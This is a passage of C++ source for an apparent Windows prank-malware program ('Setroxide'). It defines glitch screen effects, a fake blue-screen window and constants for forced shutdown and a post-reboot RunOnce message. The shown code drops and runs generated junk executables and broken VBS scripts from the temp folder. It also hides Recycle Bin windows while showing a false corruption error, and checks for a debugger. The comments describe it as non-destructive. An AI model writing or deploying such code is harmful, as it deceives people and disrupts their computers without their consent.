#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#ifndef WINVER
#define WINVER 0x0601
#endif

#include <windows.h>
#include <cstring>
#include <mmsystem.h>
#include <algorithm>
#include <cctype>
#include <cmath>
#include <cstdint>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <vector>

#ifdef _OPENMP
#include <omp.h>
#endif

#ifndef WS_EX_LAYERED
#define WS_EX_LAYERED 0x00080000
#endif
#ifndef ULW_ALPHA
#define ULW_ALPHA 0x00000002
#endif
#ifndef AC_SRC_OVER
#define AC_SRC_OVER 0x00
#endif
#ifndef AC_SRC_ALPHA
#define AC_SRC_ALPHA 0x01
#endif
#ifndef GM_COMPATIBLE
#define GM_COMPATIBLE 1
#endif
#ifndef GM_ADVANCED
#define GM_ADVANCED 2
#endif
#ifndef HALFTONE
#define HALFTONE 4
#endif
#ifndef SRCPAINT
#define SRCPAINT 0x00EE0086
#endif
#ifndef SRCINVERT
#define SRCINVERT 0x00660046
#endif
#ifndef PATINVERT
#define PATINVERT 0x005A0049
#endif
#ifndef EWX_FORCE
#define EWX_FORCE 0x00000004
#endif
#ifndef SHTDN_REASON_MAJOR_APPLICATION
#define SHTDN_REASON_MAJOR_APPLICATION 0x00040000
#endif
#ifndef SHTDN_REASON_MINOR_OTHER
#define SHTDN_REASON_MINOR_OTHER 0x00000000
#endif

typedef BOOL (WINAPI *PFN_ALPHABLEND)(HDC, int, int, int, int, HDC, int, int, int, int, BLENDFUNCTION);
typedef BOOL (WINAPI *PFN_TRANSPARENTBLT)(HDC, int, int, int, int, HDC, int, int, int, int, UINT);
typedef BOOL (WINAPI *PFN_UPDATELAYEREDWINDOW)(HWND, HDC, POINT*, SIZE*, HDC, POINT*, COLORREF, BLENDFUNCTION*, DWORD);
typedef int  (WINAPI *PFN_SETGRAPHICSMODE)(HDC, int);
typedef BOOL (WINAPI *PFN_SETWORLDTRANSFORM)(HDC, const XFORM*);
typedef BOOL (WINAPI *PFN_GETWORLDTRANSFORM)(HDC, LPXFORM);
typedef BOOL (WINAPI *PFN_ISDEBUGGERPRESENT)(VOID);
typedef BOOL (WINAPI *PFN_HEAPSETINFO)(HANDLE, HEAP_INFORMATION_CLASS, PVOID, SIZE_T);
typedef LONG (NTAPI  *PFN_RTLGETVERSION)(PRTL_OSVERSIONINFOW);

enum OsEra {
    OS_ERA_WIN95 = 0,
    OS_ERA_WIN98_ME = 1,
    OS_ERA_WIN2K = 2,
    OS_ERA_WINXP = 3,
    OS_ERA_VISTA = 4,
    OS_ERA_WIN7 = 5,
    OS_ERA_WIN8_81 = 6,
    OS_ERA_WIN10 = 7,
    OS_ERA_WIN11 = 8
};

struct DetectedOsInfo {
    OsEra era;
    DWORD major;
    DWORD minor;
    DWORD build;
    DWORD platformId;
    char label[64];
};

static const char* kBsodClass = "SetroxideWin7BSOD";
static const char* kMiniWinClass = "SetroxideMiniPopClass";
static const char* kRunOnceValueName = "SetroxideGotchaBootMsg";
static const char* kGotchaArg = "--gotcha-post-reboot";
static const UINT_PTR kRenderTimerId = 1;
static const UINT_PTR kCloseBsodMsgId = WM_APP + 1;
static const int kBufW = 800;
static const int kBufH = 600;
static const int kNumTracks = 14;
static const int kMaxConcurrentEffects = 8;
static const DWORD kEffectWindowMs = 2500;
static const DWORD kHiddenFiveMinMs = 5UL * 60UL * 1000UL;
static const double kBytebeatTrackDurationSec = 22.0;

static HWND g_hBsodWnd = nullptr;
static HBITMAP g_hBsodBmp = nullptr;
static HBITMAP g_hFrameBmp = nullptr;
static std::uint32_t* g_pFramePixels = nullptr;
static int g_screenW = 0;
static int g_screenH = 0;

static volatile bool g_audioRunning = false;
static volatile bool g_bsodEnded = false;
static volatile bool g_finalSequenceStarted = false;
static volatile bool g_finalBlackFlash = false;
static volatile bool g_finalWin7BsodActive = false;
static volatile double g_currentT = 0.0;
static volatile int g_activeTrackIdx = -1;
static volatile DWORD g_trackEpoch = 0;
static volatile DWORD g_sessionStartTick = 0;
static volatile LONG g_recycleMsgActive = 0;
static volatile int g_explorerHideStep = 0;
static HANDLE g_hAudioThread = nullptr;
static HANDLE g_hGdiEffectsThread = nullptr;
static HANDLE g_hRecycleWatcherThread = nullptr;
static HANDLE g_hExplorerFakeScanThread = nullptr;
static HANDLE g_hFiveMinWatcherThread = nullptr;

static CRITICAL_SECTION g_stateCs;
static DWORD g_tlsStepSlot = TLS_OUT_OF_INDEXES;
static HANDLE g_hScratchHeap = nullptr;
static DetectedOsInfo g_osInfo = { OS_ERA_WIN7, 6, 1, 7601, VER_PLATFORM_WIN32_NT, "Windows 7" };

static PFN_ALPHABLEND g_pfnAlphaBlend = nullptr;
static PFN_TRANSPARENTBLT g_pfnTransparentBlt = nullptr;
static PFN_UPDATELAYEREDWINDOW g_pfnUpdateLayeredWindow = nullptr;
static PFN_SETGRAPHICSMODE g_pfnSetGraphicsMode = nullptr;
static PFN_SETWORLDTRANSFORM g_pfnSetWorldTransform = nullptr;
static PFN_GETWORLDTRANSFORM g_pfnGetWorldTransform = nullptr;
static PFN_ISDEBUGGERPRESENT g_pfnIsDebuggerPresent = nullptr;
static PFN_HEAPSETINFO g_pfnHeapSetInformation = nullptr;

// 38 Shaders (0..37) + 19 Payloads (38..56) = 57 Total Effects
enum GdiEffectType {
    FX_SHD_00_PLASMA = 0,
    FX_SHD_01_TUNNEL,
    FX_SHD_02_XOR_MATRIX,
    FX_SHD_03_RGB_SPLIT_X,
    FX_SHD_04_RGB_SPLIT_Y,
    FX_SHD_05_HUE_CYCLE,
    FX_SHD_06_SCANLINE_ROLL,
    FX_SHD_07_CRT_NOISE,
    FX_SHD_08_WAVE_HORIZ,
    FX_SHD_09_WAVE_VERT,
    FX_SHD_10_SWIRL,
    FX_SHD_11_RIPPLE_RADIAL,
    FX_SHD_12_MANDEL_ORBIT,
    FX_SHD_13_CHECKER_WARP,
    FX_SHD_14_SOLARIZE,
    FX_SHD_15_POSTERIZE,
    FX_SHD_16_BIT_AND_MASK,
    FX_SHD_17_BIT_OR_BOOST,
    FX_SHD_18_INVERT_BANDS,
    FX_SHD_19_CHROME_BANDS,
    FX_SHD_20_KALEIDO_QUAD,
    FX_SHD_21_VIGNETTE_PULSE,
    FX_SHD_22_DIAGONAL_SHEAR,
    FX_SHD_23_BLOCK_SHUFFLE,
    FX_SHD_24_PIXEL_MOSAIC,
    FX_SHD_25_STATIC_SNOW,
    FX_SHD_26_COLOR_SHIFT_GBR,
    FX_SHD_27_COLOR_SHIFT_BRG,
    FX_SHD_28_MOD_GRID,
    FX_SHD_29_SINE_CROSS,
    FX_SHD_30_HYPERSPACE_STREAK,
    FX_SHD_31_THERMAL_MAP,
    FX_SHD_32_GLITCH_TEAR,
    FX_SHD_33_SPIRAL_TUNNEL,
    FX_SHD_34_PHASE_COMB,
    FX_SHD_35_NOISE_DITHER,
    FX_SHD_36_WARP_LENS,
    FX_SHD_37_META_STACK,

    FX_PLD_00_UP_RIGHT,
    FX_PLD_01_HUE_SLEEP,
    FX_PLD_02_SIERPINSKI,
    FX_PLD_03_RAINBOW_XOR,
    FX_PLD_04_ERR_ICON_ROTOZOOM,
    FX_PLD_05_FLASH_RED,
    FX_PLD_06_ERROR_SOUNDS,
    FX_PLD_07_INVERT_CIRCLE,
    FX_PLD_08_WARN_ICON_STRETCH,
    FX_PLD_09_RANDOM_WINDOWS,
    FX_PLD_10_DARKEN,
    FX_PLD_11_PIXELATE,
    FX_PLD_12_CORNER_ICONS,
    FX_PLD_13_DOWNLOAD_MSGBOX,
    FX_PLD_14_HOURGLASSES,
    FX_PLD_15_SCREEN_ROTOZOOM,
    FX_PLD_16_EXPLORER_SCAN_HIDE,
    FX_PLD_17_FAKE_16BIT_EXE,
    FX_PLD_18_FAKE_VBS_WSCRIPT_ERR,

    kNumShaders = 38,
    kNumPayloads = 19,
    kNumEffects = 57
};

static void InitDynamicCompatApis() {
    HMODULE hMsimg32 = LoadLibraryA("msimg32.dll");
    if (hMsimg32) {
        g_pfnAlphaBlend = (PFN_ALPHABLEND)GetProcAddress(hMsimg32, "AlphaBlend");
        g_pfnTransparentBlt = (PFN_TRANSPARENTBLT)GetProcAddress(hMsimg32, "TransparentBlt");
    }

    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    if (!hUser32) hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        g_pfnUpdateLayeredWindow = (PFN_UPDATELAYEREDWINDOW)GetProcAddress(hUser32, "UpdateLayeredWindow");
    }

    HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");
    if (!hGdi32) hGdi32 = LoadLibraryA("gdi32.dll");
    if (hGdi32) {
        g_pfnSetGraphicsMode = (PFN_SETGRAPHICSMODE)GetProcAddress(hGdi32, "SetGraphicsMode");
        g_pfnSetWorldTransform = (PFN_SETWORLDTRANSFORM)GetProcAddress(hGdi32, "SetWorldTransform");
        g_pfnGetWorldTransform = (PFN_GETWORLDTRANSFORM)GetProcAddress(hGdi32, "GetWorldTransform");
    }

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        g_pfnIsDebuggerPresent = (PFN_ISDEBUGGERPRESENT)GetProcAddress(hKernel32, "IsDebuggerPresent");
        g_pfnHeapSetInformation = (PFN_HEAPSETINFO)GetProcAddress(hKernel32, "HeapSetInformation");
    }
}

static DetectedOsInfo DetectWindows95To11() {
    DetectedOsInfo info = { OS_ERA_WIN7, 6, 1, 7601, VER_PLATFORM_WIN32_NT, "Windows (Win95-Win11)" };

    OSVERSIONINFOA osviA = { 0 };
    osviA.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(&osviA);
    info.major = osviA.dwMajorVersion;
    info.minor = osviA.dwMinorVersion;
    info.build = osviA.dwBuildNumber & 0xFFFF;
    info.platformId = osviA.dwPlatformId;

    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (hNtDll) {
        PFN_RTLGETVERSION pRtlGetVersion = (PFN_RTLGETVERSION)GetProcAddress(hNtDll, "RtlGetVersion");
        if (pRtlGetVersion) {
            RTL_OSVERSIONINFOW rtlVer = { 0 };
            rtlVer.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
            if (pRtlGetVersion(&rtlVer) == 0 && rtlVer.dwMajorVersion > 0) {
                info.major = rtlVer.dwMajorVersion;
                info.minor = rtlVer.dwMinorVersion;
                info.build = rtlVer.dwBuildNumber & 0xFFFF;
                info.platformId = rtlVer.dwPlatformId;
            }
        }
    }

    if (info.platformId == VER_PLATFORM_WIN32_WINDOWS) {
        if (info.major == 4 && info.minor == 0) {
            info.era = OS_ERA_WIN95;
            std::snprintf(info.label, sizeof(info.label), "Windows 95 (%lu.%lu.%lu)", info.major, info.minor, info.build);
        } else {
            info.era = OS_ERA_WIN98_ME;
            std::snprintf(info.label, sizeof(info.label), "Windows 98/Me (%lu.%lu.%lu)", info.major, info.minor, info.build);
        }
    } else if (info.major == 5 && info.minor == 0) {
        info.era = OS_ERA_WIN2K;
        std::snprintf(info.label, sizeof(info.label), "Windows 2000 (%lu.%lu.%lu)", info.major, info.minor, info.build);
    } else if (info.major == 5 && info.minor >= 1) {
        info.era = OS_ERA_WINXP;
        std::snprintf(info.label, sizeof(info.label), "Windows XP (%lu.%lu.%lu)", info.major, info.minor, info.build);
    } else if (info.major == 6 && info.minor == 0) {
        info.era = OS_ERA_VISTA;
        std::snprintf(info.label, sizeof(info.label), "Windows Vista (%lu.%lu.%lu)", info.major, info.minor, info.build);
    } else if (info.major == 6 && info.minor == 1) {
        info.era = OS_ERA_WIN7;
        std::snprintf(info.label, sizeof(info.label), "Windows 7 (%lu.%lu.%lu)", info.major, info.minor, info.build);
    } else if (info.major == 6 && (info.minor == 2 || info.minor == 3)) {
        info.era = OS_ERA_WIN8_81;
        std::snprintf(info.label, sizeof(info.label), "Windows 8/8.1 (%lu.%lu.%lu)", info.major, info.minor, info.build);
    } else if (info.major >= 10) {
        if (info.build >= 22000) {
            info.era = OS_ERA_WIN11;
            std::snprintf(info.label, sizeof(info.label), "Windows 11 (%lu.%lu.%lu)", info.major, info.minor, info.build);
        } else {
            info.era = OS_ERA_WIN10;
            std::snprintf(info.label, sizeof(info.label), "Windows 10 (%lu.%lu.%lu)", info.major, info.minor, info.build);
        }
    } else {
        std::snprintf(info.label, sizeof(info.label), "Windows (%lu.%lu.%lu)", info.major, info.minor, info.build);
    }

    return info;
}

static unsigned int MixEntropySeed(unsigned int extraSalt) {
    LARGE_INTEGER qpc = { 0 };
    QueryPerformanceCounter(&qpc);
    FILETIME ft = { 0 };
    GetSystemTimeAsFileTime(&ft);
    DWORD tick = GetTickCount();
    DWORD pid = GetCurrentProcessId();
    DWORD tid = GetCurrentThreadId();

    std::uint64_t h = (std::uint64_t)qpc.QuadPart;
    h ^= ((std::uint64_t)ft.dwLowDateTime << 17) | ((std::uint64_t)ft.dwHighDateTime >> 13);
    h ^= ((std::uint64_t)tick * 2654435761ULL);
    h ^= ((std::uint64_t)pid * 2246822519ULL) ^ ((std::uint64_t)tid * 3266489917ULL);
    h ^= ((std::uint64_t)extraSalt * 0x9E3779B97F4A7C15ULL);
    h = (h ^ (h >> 30)) * 0xBF58476D1CE4E5B9ULL;
    h = (h ^ (h >> 27)) * 0x94D049BB133111EBULL;
    h = h ^ (h >> 31);
    return (unsigned int)(h & 0xFFFFFFFFu);
}

static int PickRandomTrackIndex(int avoidIdx) {
    if (kNumTracks <= 1) return 0;
    int idx = std::rand() % kNumTracks;
    if (idx == avoidIdx) {
        idx = (idx + 1 + (std::rand() % (kNumTracks - 1))) % kNumTracks;
    }
    return idx;
}

static inline std::uint32_t U32(double x) {
    return (std::uint32_t)(std::int64_t)x;
}

static inline std::int32_t I32(double x) {
    return (std::int32_t)(std::int64_t)x;
}

static inline double BytebeatLog2(double x) {
    if (x <= 0.0) return 0.0;
    return std::log(x) * 1.4426950408889634;
}

static inline std::int32_t SignExtend8(std::int64_t v) {
    return (std::int32_t)((std::int8_t)(v & 0xFF));
}

static inline std::uint32_t MakeRgb(unsigned char r, unsigned char g, unsigned char b) {
    return ((std::uint32_t)r << 16) | ((std::uint32_t)g << 8) | (std::uint32_t)b;
}

static inline unsigned char ClampByte(int v) {
    return (unsigned char)std::max(0, std::min(255, v));
}

static inline unsigned char BlendChannel(unsigned char baseC, unsigned char overC, int alpha256) {
    return (unsigned char)((baseC * (256 - alpha256) + overC * alpha256) >> 8);
}

static void TouchSafeRuntimeApis() {
    DWORD threadId = GetCurrentThreadId();
    HANDLE curThread = GetCurrentThread();
    HANDLE curProc = GetCurrentProcess();
    DWORD procId = GetCurrentProcessId();
    (void)threadId;
    (void)curThread;
    (void)curProc;
    (void)procId;

    SetPriorityClass(curProc, ABOVE_NORMAL_PRIORITY_CLASS);
    SetThreadPriority(curThread, THREAD_PRIORITY_ABOVE_NORMAL);

    SYSTEM_INFO si = { 0 };
    GetSystemInfo(&si);

    FILETIME ft = { 0 };
    GetSystemTimeAsFileTime(&ft);

    LARGE_INTEGER qpc = { 0 }, qpf = { 0 };
    QueryPerformanceCounter(&qpc);
    QueryPerformanceFrequency(&qpf);

    char sysDirA[MAX_PATH] = { 0 };
    GetSystemDirectoryA(sysDirA, MAX_PATH);

    char tempA[MAX_PATH] = { 0 };
    GetTempPathA(MAX_PATH, tempA);

    char modA[MAX_PATH] = { 0 };
    GetModuleFileNameA(nullptr, modA, MAX_PATH);

    const char* prefix = "Setroxide";
    const char* suffix = "_GDI";
    char joined[64] = { 0 };
    lstrcatA(joined, prefix);
    lstrcatA(joined, suffix);
    int lenA = lstrlenA(joined);
    int cmpA = lstrcmpA(joined, "Setroxide_GDI");
    (void)lenA;
    (void)cmpA;

    char lcmapA[128] = { 0 };
    LCMapStringA(LOCALE_USER_DEFAULT, LCMAP_UPPERCASE, joined, -1, lcmapA, 128);

    char locBuf[32] = { 0 };
    GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, locBuf, 32);

    UINT acp = GetACP();
    UINT oemcp = GetOEMCP();
    CPINFO cpi = { 0 };
    GetCPInfo(acp, &cpi);
    (void)IsValidCodePage(oemcp);

    OSVERSIONINFOA osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(&osvi);

    STARTUPINFOA startupA = { 0 };
    GetStartupInfoA(&startupA);
    LPCSTR cmdA = GetCommandLineA();
    (void)cmdA;

    LPCH envA = GetEnvironmentStrings();
    if (envA) FreeEnvironmentStringsA(envA);

    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hStdOut != INVALID_HANDLE_VALUE && hStdOut != nullptr) {
        GetFileType(hStdOut);
    }

    if (g_pfnIsDebuggerPresent) {
        (void)g_pfnIsDebuggerPresent();
    }

    HANDLE pHeap = GetProcessHeap();
    if (pHeap) {
        if (g_pfnHeapSetInformation) {
            g_pfnHeapSetInformation(pHeap, HeapEnableTerminationOnCorruption, nullptr, 0);
        }
        void* pMem = HeapAlloc(pHeap, 0, 256);
        if (pMem) {
            pMem = HeapReAlloc(pHeap, 0, pMem, 512);
            if (pMem) {
                (void)HeapSize(pHeap, 0, pMem);
                HeapFree(pHeap, 0, pMem);
            }
        }
    }

    if (!g_hScratchHeap) {
        g_hScratchHeap = HeapCreate(0, 4096, 0);
    }

    void* vMem = VirtualAlloc(nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (vMem) {
        VirtualFree(vMem, 0, MEM_RELEASE);
    }

    HLOCAL hLoc = LocalAlloc(LMEM_FIXED, 128);
    if (hLoc) {
        LocalFree(hLoc);
    }

    if (g_tlsStepSlot != TLS_OUT_OF_INDEXES) {
        TlsSetValue(g_tlsStepSlot, (LPVOID)(std::intptr_t)(GetTickCount() & 0xFFFF));
        (void)TlsGetValue(g_tlsStepSlot);
    }

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        FARPROC pfn = GetProcAddress(hKernel32, "GetTickCount");
        (void)pfn;
    }

    HMODULE hExtra = LoadLibraryA("user32.dll");
    if (hExtra) FreeLibrary(hExtra);

    DWORD fileAttrA = GetFileAttributesA(modA);
    (void)fileAttrA;

    HANDLE hSelfFile = CreateFileA(modA, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hSelfFile != INVALID_HANDLE_VALUE) {
        DWORD szHigh = 0;
        DWORD szLow = GetFileSize(hSelfFile, &szHigh);
        BYTE tinyRead[16] = { 0 };
        DWORD bytesRead = 0;
        ReadFile(hSelfFile, tinyRead, sizeof(tinyRead), &bytesRead, nullptr);
        CloseHandle(hSelfFile);
        (void)szLow;
    }

    WIN32_FIND_DATAA wfdA = { 0 };
    char searchPatA[MAX_PATH] = { 0 };
    lstrcatA(searchPatA, tempA);
    lstrcatA(searchPatA, "*.tmp");
    HANDLE hFindA = FindFirstFileA(searchPatA, &wfdA);
    if (hFindA != INVALID_HANDLE_VALUE) {
        while (FindNextFileA(hFindA, &wfdA)) {
            break;
        }
        FindClose(hFindA);
    }

    SetLastError(0);
    (void)GetLastError();
}

static void InterruptibleSleep(DWORD totalMs) {
    DWORD waited = 0;
    while (g_audioRunning && !g_finalSequenceStarted && waited < totalMs) {
        DWORD chunk = std::min<DWORD>(10, totalMs - waited);
        Sleep(chunk);
        waited += chunk;
    }
}

// --- Fake 16-Bit (NE) + Garbage EXE Generator & Launcher ---

static void WriteLe16At(std::vector<std::uint8_t>& buf, size_t offset, std::uint16_t val) {
    if (offset + 1 >= buf.size()) return;
    buf[offset] = (std::uint8_t)(val & 0xFF);
    buf[offset + 1] = (std::uint8_t)((val >> 8) & 0xFF);
}

static std::vector<std::uint8_t> BuildFake16BitGarbageExe(int seed) {
    std::vector<std::uint8_t> img;
    img.reserve(4096);

    img.resize(64, 0);
    img[0] = 'M';
    img[1] = 'Z';
    WriteLe16At(img, 0x02, 0x0040);
    WriteLe16At(img, 0x04, 0x0001);
    WriteLe16At(img, 0x08, 0x0004);
    WriteLe16At(img, 0x0A, 0x0010);
    WriteLe16At(img, 0x0C, 0xFFFF);
    WriteLe16At(img, 0x10, 0x0100);
    WriteLe16At(img, 0x16, 0x0000);
    WriteLe16At(img, 0x18, 0x0040);
    WriteLe16At(img, 0x3C, 0x0040);

    const size_t neBase = img.size();
    img.resize(neBase + 64, 0);
    img[neBase + 0] = 'N';
    img[neBase + 1] = 'E';
    img[neBase + 2] = 5;
    img[neBase + 3] = 1;
    WriteLe16At(img, neBase + 0x04, 0x0080);
    WriteLe16At(img, neBase + 0x06, 0x0008);
    WriteLe16At(img, neBase + 0x0C, 0x0002);
    WriteLe16At(img, neBase + 0x0E, 0x0001);
    WriteLe16At(img, neBase + 0x10, 0x0200);
    WriteLe16At(img, neBase + 0x12, 0x0200);
    WriteLe16At(img, neBase + 0x16, 0x0001);
    WriteLe16At(img, neBase + 0x18, 0x0000);
    WriteLe16At(img, neBase + 0x1A, 0x0001);
    WriteLe16At(img, neBase + 0x22, 0x0040);
    WriteLe16At(img, neBase + 0x24, 0x0000);
    WriteLe16At(img, neBase + 0x26, 0x0088);
    WriteLe16At(img, neBase + 0x2C, 0x0001);
    WriteLe16At(img, neBase + 0x36, 0x0002);

    static const std::uint8_t k16BitStubCode[] = {
        0xB8, 0x00, 0x10,
        0x8E, 0xD8,
        0xB4, 0x0E,
        0xB0, 0x31,
        0xCD, 0x10,
        0xB0, 0x36,
        0xCD, 0x10,
        0x31, 0xC0,
        0xCD, 0x21,
        0xCB
    };
    for (size_t i = 0; i < sizeof(k16BitStubCode); ++i) {
        img.push_back(k16BitStubCode[i]);
    }

    unsigned int rng = (unsigned int)(seed * 1103515245 + 12345);
    for (int i = 0; i < 1536; ++i) {
        rng = rng * 1664525u + 1013904223u;
        unsigned char g = (unsigned char)(((rng >> 16) ^ (i * 19 + seed * 37)) & 0xFF);
        img.push_back(g);
    }

    return img;
}

static DWORD WINAPI SpawnAndRun16BitGarbageExeThread(LPVOID lpParam) {
    if (g_finalSequenceStarted) return 0;
    int seed = (int)(std::intptr_t)lpParam;

    char tempDirA[MAX_PATH] = { 0 };
    if (GetTempPathA(MAX_PATH, tempDirA) == 0) {
        return 0;
    }

    char exePathA[MAX_PATH] = { 0 };
    std::snprintf(exePathA, MAX_PATH, "%s\\setroxide_16bit_%d.exe", tempDirA, seed);

    std::vector<std::uint8_t> bytes = BuildFake16BitGarbageExe(seed);

    HANDLE hFile = CreateFileA(
        exePathA,
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    DWORD written = 0;
    WriteFile(hFile, bytes.data(), (DWORD)bytes.size(), &written, nullptr);
    CloseHandle(hFile);

    STARTUPINFOA siA = { 0 };
    siA.cb = sizeof(siA);
    siA.dwFlags = STARTF_USESHOWWINDOW;
    siA.wShowWindow = SW_SHOW;
    PROCESS_INFORMATION piA = { 0 };

    if (CreateProcessA(exePathA, nullptr, nullptr, nullptr, FALSE, 0, nullptr, tempDirA, &siA, &piA)) {
        WaitForSingleObject(piA.hProcess, 1500);
        CloseHandle(piA.hProcess);
        CloseHandle(piA.hThread);
    }

    DeleteFileA(exePathA);
    return 0;
}

static void TriggerFake16BitGarbageExe(int step) {
    if (g_finalSequenceStarted) return;
    HANDLE h = CreateThread(
        nullptr,
        0,
        SpawnAndRun16BitGarbageExeThread,
        (LPVOID)(std::intptr_t)(step + (std::rand() % 10000)),
        0,
        nullptr
    );
    if (h) CloseHandle(h);
}

// --- Fake WScript VBS Generator & Error Trigger ---

static std::string BuildRandomWScriptErrorVbs(int seed) {
    static const char kAlpha[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_$@!~^";
    const int alphaLen = (int)(sizeof(kAlpha) - 1);

    unsigned int rng = (unsigned int)(seed * 1664525u + 1013904223u);
    auto randStr = [&](int minLen, int maxLen) -> std::string {
        rng = rng * 1664525u + 1013904223u;
        int len = minLen + (int)((rng >> 16) % (unsigned int)(std::max(1, maxLen - minLen + 1)));
        std::string s;
        s.reserve((size_t)len);
        for (int i = 0; i < len; ++i) {
            rng = rng * 1664525u + 1013904223u;
            s.push_back(kAlpha[(rng >> 20) % (unsigned int)alphaLen]);
        }
        return s;
    };

    std::string body;
    body.reserve(1024);

    body += "' SETROXIDE WScript Error Test\r\n";
    for (int i = 0; i < 6; ++i) {
        std::string v1 = randStr(4, 10);
        std::string v2 = randStr(5, 14);
        body += "WScript.Echo \"" + v1 + "_" + v2 + "\"\r\n";
    }

    switch ((unsigned int)seed % 4u) {
        case 0u:
            body += "Set " + randStr(4, 8) + " = WScript.CreateObject(" + randStr(6, 12) + "\r\n";
            break;
        case 1u:
            body += "WScript." + randStr(5, 11) + " (" + randStr(4, 9) + " === " + randStr(3, 7) + ")\r\n";
            break;
        case 2u:
            body += "Sub " + randStr(4, 8) + "()\r\n  WScript.Sleep " + randStr(3, 6) + "\r\n";
            break;
        default:
            body += "Err.Raise 13, \"WScript.Host\", \"" + randStr(8, 18) + "\"\r\n";
            break;
    }

    for (int i = 0; i < 6; ++i) {
        body += randStr(8, 28) + "\r\n";
    }

    return body;
}

static DWORD WINAPI SpawnWScriptErrorVbsThread(LPVOID lpParam) {
    if (g_finalSequenceStarted) return 0;
    int seed = (int)(std::intptr_t)lpParam;

    char tempDirA[MAX_PATH] = { 0 };
    if (GetTempPathA(MAX_PATH, tempDirA) == 0) {
        return 0;
    }

    char vbsPathA[MAX_PATH] = { 0 };
    std::snprintf(vbsPathA, MAX_PATH, "%s\\setroxide_wscript_%d.vbs", tempDirA, seed);

    std::string scriptText = BuildRandomWScriptErrorVbs(seed);

    HANDLE hFile = CreateFileA(
        vbsPathA,
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    DWORD written = 0;
    WriteFile(hFile, scriptText.data(), (DWORD)scriptText.size(), &written, nullptr);
    CloseHandle(hFile);

    char cmdLineA[MAX_PATH + 64] = { 0 };
    std::snprintf(cmdLineA, sizeof(cmdLineA), "wscript.exe //E:VBScript \"%s\"", vbsPathA);

    STARTUPINFOA siA = { 0 };
    siA.cb = sizeof(siA);
    siA.dwFlags = STARTF_USESHOWWINDOW;
    siA.wShowWindow = SW_SHOW;
    PROCESS_INFORMATION piA = { 0 };

    if (CreateProcessA(nullptr, cmdLineA, nullptr, nullptr, FALSE, 0, nullptr, tempDirA, &siA, &piA)) {
        WaitForSingleObject(piA.hProcess, 1800);
        CloseHandle(piA.hProcess);
        CloseHandle(piA.hThread);
    }

    DeleteFileA(vbsPathA);
    return 0;
}

static void TriggerFakeWScriptErrorVbs(int step) {
    if (g_finalSequenceStarted) return;
    HANDLE h = CreateThread(
        nullptr,
        0,
        SpawnWScriptErrorVbsThread,
        (LPVOID)(std::intptr_t)(step + (std::rand() % 10000)),
        0,
        nullptr
    );
    if (h) CloseHandle(h);
}

// --- Fake Recycle Bin Corruption Trick (Non-Destructive) ---

static std::string ToLowerAscii(const char* s) {
    if (!s) return std::string();
    std::string out(s);
    for (size_t i = 0; i < out.size(); ++i) {
        out[i] = (char)std::tolower((unsigned char)out[i]);
    }
    return out;
}

static bool IsRecycleBinWindow(HWND hwnd) {
    if (!hwnd || !IsWindow(hwnd) || !IsWindowVisible(hwnd)) {
        return false;
    }
    if (hwnd == g_hBsodWnd) {
        return false;
    }

    char clsName[128] = { 0 };
    GetClassNameA(hwnd, clsName, sizeof(clsName));
    std::string clsLower = ToLowerAscii(clsName);
    if (clsLower != "cabinetwclass" && clsLower != "explorewclass") {
        return false;
    }

    char title[256] = { 0 };
    GetWindowTextA(hwnd, title, sizeof(title));
    std::string titleLower = ToLowerAscii(title);

    if (titleLower.find("recycle bin") != std::string::npos ||
        titleLower.find("lixeira") != std::string::npos ||
        titleLower.find("645ff040-5081-101b-9f08-00aa002f954e") != std::string::npos) {
        return true;
    }

    return false;
}

static DWORD WINAPI RecycleCorruptedMsgBoxThread(LPVOID lpParam) {
    (void)lpParam;
    if (g_finalSequenceStarted) {
        InterlockedExchange(&g_recycleMsgActive, 0);
        return 0;
    }
    UINT flags = MB_ICONERROR | MB_OK;
    if (g_osInfo.era >= OS_ERA_WIN2K) {
        flags |= MB_SYSTEMMODAL;
    }
    MessageBoxA(
        nullptr,
        "The recycle bin on the C:\\ drive is corrupted.",
        "Recycle Bin",
        flags
    );
    InterlockedExchange(&g_recycleMsgActive, 0);
    return 0;
}

static BOOL CALLBACK EnumRecycleBinProc(HWND hwnd, LPARAM lParam) {
    (void)lParam;
    if (IsRecycleBinWindow(hwnd)) {
        ShowWindow(hwnd, SW_HIDE);
        if (InterlockedCompareExchange(&g_recycleMsgActive, 1, 0) == 0) {
            HANDLE hMsg = CreateThread(nullptr, 0, RecycleCorruptedMsgBoxThread, nullptr, 0, nullptr);
            if (hMsg) {
                CloseHandle(hMsg);
            } else {
                InterlockedExchange(&g_recycleMsgActive, 0);
            }
        }
        return FALSE;
    }
    return TRUE;
}

static DWORD WINAPI RecycleBinWatcherThread(LPVOID lpParam) {
    (void)lpParam;
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
    while (g_audioRunning && !g_finalSequenceStarted) {
        EnumWindows(EnumRecycleBinProc, 0);
        InterruptibleSleep(120);
    }
    return 0;
}

// --- Non-Destructive File Explorer Fake Scan + One-by-One Visual Hide + Path Mangle ---

